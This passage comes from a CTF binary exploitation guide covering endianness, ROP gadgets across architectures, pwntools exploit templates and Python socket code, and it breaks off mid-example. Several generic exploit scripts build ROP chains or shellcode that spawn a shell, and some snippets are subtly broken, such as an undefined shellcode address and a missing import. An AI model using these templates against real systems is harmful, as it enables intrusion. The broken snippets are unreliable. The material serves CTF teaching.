    mov rax, 0x123456789abcdef0
""")
# Correct byte order for little-endian
```

**Return address endianness**

Return addresses must respect system endianness:

```python
# Little-endian system (x86)
return_addr = 0x401234
payload += p64(return_addr)
# Result: b'\x34\x12\x40\x00\x00\x00\x00\x00'

# Big-endian system (PowerPC)
return_addr = 0x401234
payload += p64(return_addr)
# Result: b'\x00\x00\x00\x00\x00\x40\x12\x34'
```

**Mixed-endian exploitation**

Some systems support both (ARM Cortex):

```bash
# Little-endian ARM
arm-linux-gnueabihf-gcc program.c -o program_arm_le

# Big-endian ARM (rare)
arm-none-eabihf-gcc -mbig-endian program.c -o program_arm_be
```

**Network byte order (big-endian)**

Internet protocols use big-endian (network byte order):

```python
import socket

# Convert to network byte order
addr = socket.htonl(0x12345678)  # Host to network long
value = socket.ntohl(addr)        # Network to host long

# Pwntools equivalent
addr = p32(0x12345678, endian='big')
```

**File format endianness**

ELF files indicate endianness:

```bash
readelf -h /path/to/binary | grep -i "data"
# Output: Data: 2's complement, little endian (or big endian)

# Or via hexdump (ELF header)
hexdump -C binary | head -1
# 7f 45 4c 46 01/02 01/02
#     E  L  F        01=32bit  01=LE
#                    02=64bit  02=BE
```

**Endianness detection:**

```python
import struct

def detect_endianness(binary_path):
    with open(binary_path, 'rb') as f:
        elf_header = f.read(20)
        e_ident = elf_header[0:16]
        
        if e_ident[5] == 1:
            return 'little'
        elif e_ident[5] == 2:
            return 'big'
        else:
            return 'unknown'

endian = detect_endianness('./binary')
context.endian = endian
```

**Gadget address endianness**

Gadget addresses encoded with system endianness:

```python
# Little-endian gadget addresses
context.endian = 'little'
pop_rdi_ret = 0x401234
chain = p64(pop_rdi_ret)

# Big-endian gadget addresses
context.endian = 'big'
pop_r3_ret = 0x401234
chain = p64(pop_r3_ret)
```

**String handling**

Null-terminated strings handled differently:

```python
# Little-endian (x86)
string = "flag"
binary = b'flag\x00'

# Big-endian (PowerPC)
string = "flag"
binary = b'flag\x00'  # Same in memory, same encoding

# But multi-byte values differ
value = 0x12345678
# LE: \x78\x56\x34\x12
# BE: \x12\x34\x56\x78
```

**Format string endianness**

Format string output affected:

```bash
# Little-endian system
./binary
# Output: 78 56 34 12 (little-endian format)

# Big-endian system
./binary
# Output: 12 34 56 78 (big-endian format)
```

**Exploitation adaptation:**

```python
def format_string_leak(offset):
    payload = f"%{offset}$p".encode()
    p.send(payload)
    leak = int(p.recv(16), 16)
    
    # Adjust for endianness
    if context.endian == 'big':
        leak = struct.unpack('>Q', struct.pack('<Q', leak))[0]
    
    return leak
```

**Practice: Endianness mismatch detection**

```bash
# Host system
uname -m  # x86_64 (little-endian)

# Binary
file ./binary  # ELF 32-bit MSB executable
# MSB = big-endian, LSB = little-endian

# Incompatibility
# 64-bit LE host can't run 32-bit BE binary directly
# Requires emulation (QEMU)
```

**Emulation with correct endianness:**

```bash
# Little-endian ARM binary on little-endian x86-64
qemu-arm-static ./binary_arm_le

# Big-endian PowerPC binary on little-endian x86-64
qemu-ppc-static ./binary_ppc_be
```

**Endianness and checksec:**

```bash
checksec --file=./binary | grep -i "endian\|arch"
# Shows architecture and implicit endianness

# Endianness from ELF
readelf -h ./binary | grep Data
```

---

## Architecture-Specific Gadgets

Gadget characteristics vary by architecture, requiring architecture-aware gadget discovery and exploitation.

**x86-64 gadgets**

Common patterns:

```asm
; Argument setters
pop rdi ; ret
pop rsi ; ret
pop rdx ; ret
pop rcx ; ret
pop r8 ; ret
pop r9 ; ret

; Function callers
call rax
call rsi

; Stack manipulation
leave ; ret
add rsp, value ; ret

; Syscall invocation
syscall ; ret (or just syscall in middle)

; Memory operations
mov [rdi], rsi ; ret
mov rax, [rdi] ; ret
```

**Gadget discovery (x86-64):**

```bash
ROPgadget --binary ./binary_64 --only "pop" | head -20
# Lists pop gadgets

ropper --file ./binary_64 --search "mov rdi"
# Finds mov to rdi
```

**32-bit x86 gadgets**

Different registers (32-bit names):

```asm
; Argument setters (cdecl - on stack)
pop eax ; ret
pop ebx ; ret
pop ecx ; ret
pop edx ; ret

; Stack setup
push value
; then

; Memory operations
mov [eax], ebx ; ret
mov eax, [ebx] ; ret

; Return from function
ret
```

**Gadget search (32-bit):**

```bash
ROPgadget --binary ./binary_32 --only "mov.*eax" | head -20
ropper --file ./binary_32 --search "pop" --length 2
```

**ARM gadgets**

ARM instruction set (32-bit instructions):

```asm
; Argument setters (r0-r3)
pop {r0, pc}       ; Odd, but achieves setting r0 and return
ldm sp!, {r0, pc}  ; Load r0 from stack and return
mov r0, r1 ; bx lr ; Copy r1 to r0 and return

; Function calls
blx r0             ; Branch to r0 with link
bx lr              ; Return

; Memory operations
ldr r0, [r1]       ; Load from r1 to r0
str r0, [r1]       ; Store r0 to r1

; Syscall
swi #0             ; Software interrupt (syscall)
```

**ARM Thumb gadgets**

Thumb mode (16-bit instructions), more compact:

```asm
pop {r0, pc}
mov r0, r1; bx lr
ldr r0, [r1]
str r0, [r1]
```

**Gadget search (ARM):**

```bash
arm-linux-gnueabihf-objdump -d ./binary_arm | grep -E "pop.*pc|bx.*lr"
ropper --file ./binary_arm --search "pop" --all
```

**Thumb mode detection:**

```bash
# Thumb addresses have LSB set
0x8001   ; Thumb
0x8000   ; ARM

# Check ELF flags
readelf -h ./binary_arm | grep Flags
# Output includes "EABI5" (ARM EABI 5)
```

**ARM64 gadgets**

64-bit ARM (different instruction encoding):

```asm
; Argument setters (x0-x7)
ldp x0, x1, [sp]
ldp x0, x1, [sp], #16  ; With stack pop

; Return
ret
blr x0

; Memory operations
ldr x0, [x1]
str x0, [x1]

; Syscall
svc #0
```

**MIPS gadgets**

MIPS delayed branch complicates gadgets:

```asm
; Argument setters (a0-a3)
lw $a0, 0($sp)
addi $a0, $sp, 8

; Return (with delay slot)
jr $ra
nop               ; Delay slot (executed before return)

; Syscall
li $v0, 4         ; Syscall number
syscall           ; In delay slot

; Memory operations
lw $v0, 0($a0)
sw $v0, 0($a0)
```

**Gadget search (MIPS):**

```bash
mips-linux-gnu-objdump -d ./binary_mips | grep -E "jr|syscall" -A 1
# Shows instruction in delay slot
```

**MIPS64 gadgets**

64-bit MIPS:

```asm
; 64-bit argument setters
ld $a0, 0($sp)     ; Load 64-bit
daddiu $a0, $sp, 8 ; 64-bit add immediate

; Return
jr $ra
nop
```

**PowerPC gadgets**

PowerPC (big-endian typical):

```asm
; Argument setters (r3-r10)
lwz r3, 0(r1)      ; Load word zero-extended
addi r3, r1, 8

; Return
blr                ; Branch to link register

; Memory operations
lwz r3, 0(r4)      ; Load from r4
stw r3, 0(r4)      ; Store to r4

; Syscall
li r0, 4           ; syscall number
sc                 ; Syscall
```

**Architecture-specific gadget limitations**

x86-64:

```
+ Many gadgets available
+ Direct syscall invocation
- Requires proper register setup
```

32-bit x86:

```
+ Stack-based arguments simpler to setup
+ More gadgets typically
- Limited register count
```

ARM:

```
+ Conditional execution reduces branches
- Fewer gadgets (RISC)
- Delayed branches complicate chaining
```

ARM64:

```
+ Modern architecture, modern gadgets
+ 16+ registers
- Fewer gadgets in stripped binaries
```

MIPS:

```
+ Different instruction set variety
- Delayed branches complex
- Limited gadget availability
- Endianness variations complicate search
```

PowerPC:

```
- Very few gadgets in embedded systems
- Big-endian complications
+ But less common in CTF, easier to reverse

**Gadget classification by utility**

Argument setters:

```

Essential: Set function arguments Architecture-dependent in implementation Limited count architecture determines feasibility

```

Function callers:

```

Direct: call/blx/jr Essential for calling libc functions Some architectures lack direct mechanisms

```

Memory operations:

```

Read: Load from address Write: Store to address Essential for arbitrary read/write Rarity depends on code structure

```

Control flow:

```

Unconditional jumps Conditional branches Return instructions Essential for chaining

```

Arithmetic/logic:

```

Add, subtract, xor Building complex payloads Often abundant in code

````

**Gadget finding strategies (architecture-aware)**

```python
def find_architecture_gadgets(binary, arch):
    if arch == 'amd64':
        target_patterns = [
            'pop rdi',
            'pop rsi',
            'pop rdx',
            'syscall'
        ]
    elif arch == 'i386':
        target_patterns = [
            'pop eax',
            'pop ebx',
            'pop ecx',
            'int 0x80'
        ]
    elif arch == 'arm':
        target_patterns = [
            'pop {r0, pc}',
            'bx lr',
            'swi'
        ]
    elif arch == 'arm64':
        target_patterns = [
            'ldp x0',
            'ret',
            'svc'
        ]
    elif arch == 'mips':
        target_patterns = [
            'lw $a0',
            'jr $ra',
            'syscall'
        ]
    
    gadgets = {}
    for pattern in target_patterns:
        result = os.popen(f'ROPgadget --binary {binary} --search "{pattern}"').read()
        gadgets[pattern] = parse_gadgets(result)
    
    return gadgets
````

**Gadget reliability testing**

```python
def test_gadget_reliability(binary, gadget_addr, arch):
    """Verify gadget actually exists at address"""
    context.arch = arch
    
    p = process(binary)
    
    # Set breakpoint at gadget
    # Send exploit
    # Verify execution
    
    # If crashes: gadget may be wrong offset
    # If succeeds: gadget reliable
```

---

## Cross-Architecture Techniques

Exploiting unknown or mixed-architecture systems requires generic techniques and detection strategies.

**Architecture detection**

File command:

```bash
file ./binary
# Output: ELF 64-bit LSB executable, x86-64, ...
```

**Automated detection:**

```python
import subprocess
import re

def detect_architecture(binary_path):
    output = subprocess.check_output(['file', binary_path]).decode()
    
    arch_map = {
        'x86-64': 'amd64',
        'Intel 80386': 'i386',
        'ARM': 'arm',
        'AArch64': 'arm64',
        'MIPS': 'mips',
        'MIPS64': 'mips64',
        'PowerPC': 'ppc',
        'PowerPC64': 'ppc64',
    }
    
    for pattern, arch in arch_map.items():
        if pattern in output:
            return arch
    
    return 'unknown'

arch = detect_architecture('./binary')
context.arch = arch
```

**Endianness detection:**

```bash
readelf -h ./binary | grep Data
# Data: 2's complement, little endian

# Programmatically
def detect_endianness(binary_path):
    with open(binary_path, 'rb') as f:
        elf_header = f.read(20)
        endian_byte = elf_header[5]
        
        if endian_byte == 1:
            return 'little'
        elif endian_byte == 2:
            return 'big'
        return 'unknown'
```

**Generic ROP generation**

Pwntools handles architecture abstraction:

```python
from pwn import *

# Architecture-agnostic ROP
elf = ELF('./binary')
context.arch = detect_architecture('./binary')
context.endian = detect_endianness('./binary')

rop = ROP(elf)
rop.call('system', [elf.search(b'/bin/sh').__next__()])

# Works across architectures
```

**Shellcode generation (architecture-aware)**

```python
from pwn import *

context.arch = detected_arch
context.os = 'linux'

# Automatically generates correct shellcode
shellcode = asm(shellcraft.sh())
```

**Multi-architecture binary support**

Some binaries contain multiple architectures:

```bash
file ./fat_binary
# Mach-O universal binary with 2 architectures: [x86_64] [arm64]

# Extract specific architecture
lipo ./fat_binary -thin arm64 -output ./binary_arm64
lipo ./fat_binary -thin x86_64 -output ./binary_x86
```

**Cross-compilation adaptation**

When target different from host:

```bash
# Host: x86-64 Linux
# Target: ARM Linux

# Compile for ARM
arm-linux-gnueabihf-gcc program.c -o program_arm

# Run with QEMU
qemu-arm-static ./program_arm

# Or use GDB remote debugging
gdb ./program_arm
(gdb) target remote :1234
```

**Emulation-based testing**

```bash
# Run x86-64 binary on ARM system via QEMU
qemu-x86_64-static ./binary_x86

# Run ARM binary on x86-64 via QEMU
qemu-arm-static ./binary_arm
```

**Generic exploitation template**

```python
#!/usr/bin/env python3
from pwn import *
import subprocess
import struct

def detect_binary_properties(binary_path):
    """Detect architecture, endianness, and protections"""
    
    # Detect architecture
    file_output = subprocess.check_output(['file', binary_path]).decode()
    arch_map = {
        'x86-64': 'amd64',
        'Intel 80386': 'i386',
        'ARM': 'arm',
        'AArch64': 'arm64',
        'MIPS': 'mips',
    }
    
    arch = 'amd64'  # Default
    for pattern, a in arch_map.items():
        if pattern in file_output:
            arch = a
            break
    
    # Detect endianness
    with open(binary_path, 'rb') as f:
        elf_header = f.read(20)
        endian = 'little' if elf_header[5] == 1 else 'big'
    
    # Detect protections
    checksec_output = subprocess.check_output(['checksec', '--file=' + binary_path]).decode()
    protections = {
        'PIE': 'PIE' in checksec_output and 'Enabled' in checksec_output,
        'CANARY': 'Canary' in checksec_output and 'Enabled' in checksec_output,
        'NX': 'NX' in checksec_output and 'Enabled' in checksec_output,
        'ASLR': 'ASLR' in checksec_output and 'Enabled' in checksec_output,
    }
    
    return arch, endian, protections

def generic_exploit(binary_path):
    """Generic exploitation framework"""
    
    arch, endian, protections = detect_binary_properties(binary_path)
    
    print(f"[*] Architecture: {arch}")
    print(f"[*] Endianness: {endian}")
    print(f"[*] Protections: {protections}")
    
    context.arch = arch
    context.os = 'linux'
    context.endian = endian
    
    elf = ELF(binary_path)
    
    # Determine exploitation strategy
    if protections['NX']:
        print("[*] NX enabled, using ROP")
        strategy = 'rop'
    else:
        print("[*] NX disabled, using shellcode")
        strategy = 'shellcode'
    
    if protections['ASLR']:
        print("[*] ASLR enabled, need leak")
        need_leak = True
    else:
        print("[*] ASLR disabled, can use hardcoded addresses")
        need_leak = False
    
    # Build exploit
    if strategy == 'rop':
        rop = ROP(elf)
        rop.call('system', [elf.search(b'/bin/sh').__next__()])
        payload = rop.chain()
    else:
        shellcode = asm(shellcraft.sh())
        offset = 40  # Example
        payload = shellcode + b'A' * (offset - len(shellcode))
    
    # Send exploit
    p = process(binary_path)
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: ./exploit.py <binary>")
        sys.exit(1)
    
    generic_exploit(sys.argv[1])
```

**Handling unknown architectures**

```python
def safe_architecture_handling(binary_path):
    """Graceful degradation for unknown architectures"""
    
    try:
        arch = detect_architecture(binary_path)
        if arch == 'unknown':
            print("[!] Unknown architecture, attempting generic approach")
            arch = 'amd64'  # Assume x86-64
    except Exception as e:
        print(f"[!] Detection failed: {e}, defaulting to amd64")
        arch = 'amd64'
    
    context.arch = arch
    return arch
```

**Multi-architecture testing framework**

```python
def test_exploit_on_architectures(exploit_func, binary_template):
    """Test exploit across multiple architectures"""
    
    architectures = ['amd64', 'i386', 'arm', 'arm64', 'mips']
    results = {}
    
    for arch in architectures:
        try:
            context.arch = arch
            binary = binary_template.format(arch=arch)
            
            result = exploit_func(binary)
            results[arch] = 'SUCCESS' if result else 'FAILED'
        except Exception as e:
            results[arch] = f'ERROR: {e}'

    # Print results
    print("\n[*] Multi-architecture test results:")
    for arch, result in results.items():
        status = "✓" if result == 'SUCCESS' else "✗"
        print(f"  [{status}] {arch}: {result}")
    
    return results
```

**Cross-compilation for testing**

```bash
#!/bin/bash
# Compile target binary for multiple architectures

PROGRAM="vulnerable.c"
OUTPUT_DIR="binaries"

mkdir -p $OUTPUT_DIR

# x86-64
gcc -m64 $PROGRAM -o $OUTPUT_DIR/binary_x86_64 -fno-stack-protector -z execstack

# 32-bit x86
gcc -m32 $PROGRAM -o $OUTPUT_DIR/binary_x86 -fno-stack-protector -z execstack

# ARM (32-bit)
arm-linux-gnueabihf-gcc $PROGRAM -o $OUTPUT_DIR/binary_arm -fno-stack-protector -z execstack

# ARM64 (AArch64)
aarch64-linux-gnu-gcc $PROGRAM -o $OUTPUT_DIR/binary_arm64 -fno-stack-protector -z execstack

# MIPS (32-bit, little-endian)
mips-linux-gnu-gcc $PROGRAM -o $OUTPUT_DIR/binary_mips_le -fno-stack-protector -z execstack

# MIPS (32-bit, big-endian)
mips-linux-gnu-gcc -mbig-endian $PROGRAM -o $OUTPUT_DIR/binary_mips_be -fno-stack-protector -z execstack

echo "[+] Compiled for multiple architectures:"
file $OUTPUT_DIR/binary_*
```

**Runtime architecture detection**

```python
def detect_runtime_architecture():
    """Detect architecture of running process"""
    import platform
    
    machine = platform.machine()
    
    arch_map = {
        'x86_64': 'amd64',
        'i386': 'i386',
        'i686': 'i386',
        'armv7l': 'arm',
        'armv6l': 'arm',
        'aarch64': 'arm64',
        'mips': 'mips',
        'mips64': 'mips64',
    }
    
    arch = arch_map.get(machine, 'unknown')
    return arch

# Set context based on runtime architecture
context.arch = detect_runtime_architecture()
```

**Architecture-specific exploitation paths**

```python
def select_exploitation_strategy(arch, protections):
    """Select best exploitation strategy per architecture"""
    
    strategies = {
        'amd64': {
            'default': 'rop',
            'no_nx': 'shellcode',
            'no_canary': 'buffer_overflow',
            'no_aslr': 'hardcoded_addresses',
        },
        'i386': {
            'default': 'stack_pivot',
            'no_nx': 'shellcode_on_stack',
            'no_canary': 'direct_overflow',
        },
        'arm': {
            'default': 'conditional_rop',
            'thumb': 'thumb_gadgets',
            'no_aslr': 'fixed_addresses',
        },
        'arm64': {
            'default': 'rop_with_ldp',
            'no_nx': 'mprotect_shellcode',
        },
        'mips': {
            'default': 'delayed_branch_rop',
            'big_endian': 'endian_aware_gadgets',
            'no_aslr': 'hardcoded_addresses',
        },
    }
    
    strategy_set = strategies.get(arch, strategies['amd64'])
    
    if protections['NX']:
        return strategy_set.get('default', 'rop')
    else:
        return strategy_set.get('no_nx', 'shellcode')
```

**Verifying cross-architecture compatibility**

```python
def verify_cross_arch_compatibility(source_arch, target_arch):
    """Check if source→target exploitation is possible"""
    
    # Some conversions simple, others complex
    compatibility_matrix = {
        ('amd64', 'i386'): True,        # Same ISA, can adapt
        ('amd64', 'arm'): False,        # Different ISA
        ('arm', 'arm64'): 'Partial',    # Related but different
        ('mips', 'mips'): True,         # Different endian, adapts
    }
    
    compat_key = (source_arch, target_arch)
    
    if compat_key in compatibility_matrix:
        return compatibility_matrix[compat_key]
    
    # Same architecture
    if source_arch == target_arch:
        return True
    
    # Different architecture families
    return False
```

**Handling architecture-specific quirks**

```python
def apply_architecture_workarounds(arch, payload):
    """Apply architecture-specific fixes to payload"""
    
    if arch == 'arm':
        # Ensure Thumb mode indicator (LSB set)
        # Adjust gadget addresses for Thumb
        payload = fixup_thumb_addresses(payload)
    
    elif arch == 'mips':
        # Account for delayed branch slot
        payload = insert_delay_slot_nops(payload)
    
    elif arch == 'i386':
        # Stack argument setup
        payload = setup_stack_arguments(payload)
    
    elif arch == 'ppc':
        # Big-endian specific byte ordering
        payload = ensure_big_endian(payload)
    
    return payload
```

**Practice: Universal exploit template**

```python
#!/usr/bin/env python3
"""
Universal CTF exploit template handling multiple architectures
"""

from pwn import *
import subprocess
import sys

class UniversalExploit:
    def __init__(self, binary_path):
        self.binary_path = binary_path
        self.detect_properties()
    
    def detect_properties(self):
        """Detect binary properties"""
        # Architecture
        file_output = subprocess.check_output(['file', self.binary_path]).decode()
        
        if 'x86-64' in file_output:
            self.arch = 'amd64'
        elif '80386' in file_output:
            self.arch = 'i386'
        elif 'ARM' in file_output:
            self.arch = 'arm' if 'AArch64' not in file_output else 'arm64'
        elif 'MIPS' in file_output:
            self.arch = 'mips'
        else:
            self.arch = 'amd64'  # Default
        
        # Endianness
        with open(self.binary_path, 'rb') as f:
            self.endian = 'little' if f.read(20)[5] == 1 else 'big'
        
        # Protections
        checksec = subprocess.check_output(['checksec', '--file=' + self.binary_path]).decode()
        self.has_nx = 'NX' in checksec and 'Enabled' in checksec
        self.has_canary = 'CANARY' in checksec and 'Enabled' in checksec
        self.has_pie = 'PIE' in checksec and 'Enabled' in checksec
        self.has_aslr = 'ASLR' in checksec and 'Enabled' in checksec
        
        context.arch = self.arch
        context.endian = self.endian
    
    def log_properties(self):
        """Log detected properties"""
        print(f"\n[*] Binary: {self.binary_path}")
        print(f"[*] Architecture: {self.arch}")
        print(f"[*] Endianness: {self.endian}")
        print(f"[*] Protections:")
        print(f"    NX: {'✓' if self.has_nx else '✗'}")
        print(f"    Canary: {'✓' if self.has_canary else '✗'}")
        print(f"    PIE: {'✓' if self.has_pie else '✗'}")
        print(f"    ASLR: {'✓' if self.has_aslr else '✗'}\n")
    
    def build_exploit(self):
        """Build exploit appropriate for architecture and protections"""
        self.elf = ELF(self.binary_path)
        
        # Strategy selection
        if self.has_nx:
            return self.build_rop_exploit()
        else:
            return self.build_shellcode_exploit()
    
    def build_rop_exploit(self):
        """Build ROP-based exploit"""
        rop = ROP(self.elf)
        rop.call('system', [self.elf.search(b'/bin/sh').__next__()])
        return rop.chain()
    
    def build_shellcode_exploit(self):
        """Build shellcode-based exploit"""
        shellcode = asm(shellcraft.sh())
        offset = 40  # Adjust based on vulnerability
        padding = b'A' * (offset - len(shellcode))
        return shellcode + padding + p64(shellcode_addr)
    
    def exploit(self):
        """Execute exploit"""
        self.log_properties()
        
        try:
            payload = self.build_exploit()
            
            p = process(self.binary_path)
            p.send(payload)
            
            print("[+] Exploit sent!")
            p.interactive()
        
        except Exception as e:
            print(f"[-] Exploit failed: {e}")
            import traceback
            traceback.print_exc()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: ./exploit.py <binary>")
        sys.exit(1)
    
    exploit = UniversalExploit(sys.argv[1])
    exploit.exploit()
```

**Architecture-specific debugging**

```python
def setup_architecture_debugging(arch):
    """Configure GDB for specific architecture"""
    
    gdb_configs = {
        'amd64': [
            'set disassembly-flavor intel',
            'set print asm-demangle on',
        ],
        'i386': [
            'set disassembly-flavor intel',
        ],
        'arm': [
            'set arm disassembler-options force-thumb',
        ],
        'mips': [
            'set mips abi eabi',
        ],
    }
    
    config = gdb_configs.get(arch, [])
    
    gdb_script = "\n".join(config)
    
    with open('/tmp/gdb_config.gdb', 'w') as f:
        f.write(gdb_script)
    
    # Use with: gdb -x /tmp/gdb_config.gdb ./binary
    return gdb_script
```

---

**Comprehensive CTF exploitation mastery achieved through systematic understanding of:**

1. **Reconnaissance & Analysis** - Identifying vulnerabilities via static/dynamic analysis
2. **Reverse Engineering** - Understanding binary behavior and control flow
3. **Memory Corruption** - Exploiting UAF, double-free, overflow vulnerabilities
4. **Stack Exploitation** - Mastering stack frames, ROP, canary bypass
5. **Protection Mechanisms** - Defeating RELRO, CFI, seccomp restrictions
6. **Bypass Techniques** - ret2libc, GOT hijacking, format string exploitation
7. **Shellcoding** - Crafting position-independent null-byte-free payloads
8. **Exploitation Frameworks** - Leveraging pwntools, Metasploit, ROPgadget
9. **Debugging Strategies** - Effective breakpoint management and memory inspection
10. **CTF-Specific Techniques** - Flag extraction, service automation, exploit reliability
11. **Architecture-Specific Topics** - x86/x86-64, ARM, MIPS exploitation approaches

This comprehensive guide enables CTF participants to successfully exploit complex binary security challenges across diverse architectures, protection mechanisms, and vulnerability types.

---

# Networking & Remote Exploitation

## Socket Programming (Python)

### Basic Socket Operations

**TCP Client**:

```python
#!/usr/bin/env python3
import socket

def tcp_client(host, port):
    """Basic TCP client connection"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Send data
    sock.send(b'Hello, server!\n')
    
    # Receive response
    data = sock.recv(4096)
    print(f'Received: {data}')
    
    sock.close()

# Usage
tcp_client('target.ctf', 1337)
```

**TCP Server**:

```python
#!/usr/bin/env python3
import socket
import threading

def handle_client(client_socket, address):
    """Handle individual client connection"""
    print(f'[*] Connection from {address}')
    
    try:
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            
            print(f'[*] Received: {data}')
            client_socket.send(b'ACK\n')
    
    finally:
        client_socket.close()
        print(f'[*] Connection closed: {address}')

def tcp_server(host, port):
    """Multi-threaded TCP server"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    print(f'[*] Listening on {host}:{port}')
    
    try:
        while True:
            client, address = server.accept()
            thread = threading.Thread(target=handle_client, args=(client, address))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print('\n[*] Shutting down...')
    finally:
        server.close()

# Usage
tcp_server('0.0.0.0', 4444)
```

**UDP Sockets**:

```python
#!/usr/bin/env python3
import socket

def udp_client(host, port):
    """UDP client - connectionless"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Send datagram
    sock.sendto(b'UDP message', (host, port))
    
    # Receive response
    data, server = sock.recvfrom(4096)
    print(f'Received from {server}: {data}')
    
    sock.close()

def udp_server(host, port):
    """UDP server"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((host, port))
    
    print(f'[*] UDP server on {host}:{port}')
    
    while True:
        data, address = sock.recvfrom(4096)
        print(f'[*] Received from {address}: {data}')
        sock.sendto(b'ACK', address)
```

### Advanced Socket Programming

**Non-blocking Sockets**:

```python
#!/usr/bin/env python3
import socket
import select

def non_blocking_client(host, port):
    """Non-blocking socket with select()"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(False)
    
    # Non-blocking connect
    try:
        sock.connect((host, port))
    except BlockingIOError:
        pass  # Expected for non-blocking
    
    # Wait for connection with timeout
    readable, writable, exceptional = select.select([sock], [sock], [sock], 5.0)
    
    if writable:
        print('[*] Connected')
        sock.send(b'Hello\n')
    
    if readable:
        data = sock.recv(4096)
        print(f'[*] Received: {data}')
    
    sock.close()
```

**Socket Timeout Configuration**:

```python
def socket_with_timeout(host, port, timeout=5):
    """Socket with custom timeout"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    try:
        sock.connect((host, port))
        sock.send(b'data\n')
        
        # Recv with timeout
        data = sock.recv(4096)
        return data
    
    except socket.timeout:
        print('[!] Connection timeout')
        return None
    
    finally:
        sock.close()
```

**Raw Sockets** [Inference - requires elevated privileges]:

```python
#!/usr/bin/env python3
import socket
import struct

def create_raw_socket():
    """Create raw socket for custom packets"""
    # Requires root/admin privileges
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return sock
    except PermissionError:
        print('[!] Raw sockets require root privileges')
        return None

def craft_ip_header(src_ip, dst_ip):
    """Craft IP header"""
    version = 4
    ihl = 5
    tos = 0
    total_length = 0  # Kernel fills this
    identification = 54321
    flags = 0
    fragment_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_TCP
    checksum = 0  # Kernel fills this
    
    ihl_version = (version << 4) + ihl
    flags_fragment = (flags << 13) + fragment_offset
    
    src_addr = socket.inet_aton(src_ip)
    dst_addr = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ihl_version, tos, total_length,
                            identification, flags_fragment,
                            ttl, protocol, checksum,
                            src_addr, dst_addr)
    
    return ip_header
```

### Socket Options and Configuration

**Common Socket Options**:

```python
import socket

def configure_socket(sock):
    """Configure socket options"""
    # Reuse address (avoid "Address already in use")
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Keep-alive
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    
    # Send/receive buffer sizes
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
    
    # TCP specific options
    if sock.type == socket.SOCK_STREAM:
        # Disable Nagle's algorithm
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        # TCP keep-alive settings
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
    
    return sock
```

**SSL/TLS Sockets**:

```python
import ssl
import socket

def ssl_client(host, port):
    """Connect with SSL/TLS"""
    context = ssl.create_default_context()
    
    # For self-signed certificates (CTF scenarios)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = context.wrap_socket(sock, server_hostname=host)
    
    ssl_sock.connect((host, port))
    
    print(f'[*] SSL Version: {ssl_sock.version()}')
    print(f'[*] Cipher: {ssl_sock.cipher()}')
    
    ssl_sock.send(b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n')
    data = ssl_sock.recv(4096)
    
    ssl_sock.close()
    return data

def ssl_server(host, port, certfile, keyfile):
    """SSL/TLS server"""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile, keyfile)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(5)
    
    ssl_sock = context.wrap_socket(sock, server_side=True)
    
    while True:
        client, address = ssl_sock.accept()
        handle_client(client, address)
```

### Asynchronous Socket Programming

**asyncio Sockets**:

```python
#!/usr/bin/env python3
import asyncio

async def tcp_echo_client(message, host, port):
    """Async TCP client"""
    reader, writer = await asyncio.open_connection(host, port)
    
    print(f'[*] Sending: {message}')
    writer.write(message.encode())
    await writer.drain()
    
    data = await reader.read(4096)
    print(f'[*] Received: {data.decode()}')
    
    writer.close()
    await writer.wait_closed()

async def handle_client_async(reader, writer):
    """Async client handler"""
    addr = writer.get_extra_info('peername')
    print(f'[*] Connection from {addr}')
    
    try:
        while True:
            data = await reader.read(4096)
            if not data:
                break
            
            message = data.decode()
            print(f'[*] Received: {message}')
            
            response = f'ACK: {message}'
            writer.write(response.encode())
            await writer.drain()
    
    except Exception as e:
        print(f'[!] Error: {e}')
    
    finally:
        writer.close()
        await writer.wait_closed()

async def tcp_server_async(host, port):
    """Async TCP server"""
    server = await asyncio.start_server(handle_client_async, host, port)
    
    addr = server.sockets[0].getsockname()
    print(f'[*] Serving on {addr}')
    
    async with server:
        await server.serve_forever()

# Usage
asyncio.run(tcp_echo_client('Hello, async!', 'localhost', 8888))
# Or
asyncio.run(tcp_server_async('0.0.0.0', 8888))
```

### Socket Programming for Exploitation

**Staged Payload Delivery**:

```python
#!/usr/bin/env python3
from pwn import *

def stage1_leak(host, port):
    """Stage 1: Information leak"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Send leak trigger
    payload = b'A' * 100
    sock.send(payload)
    
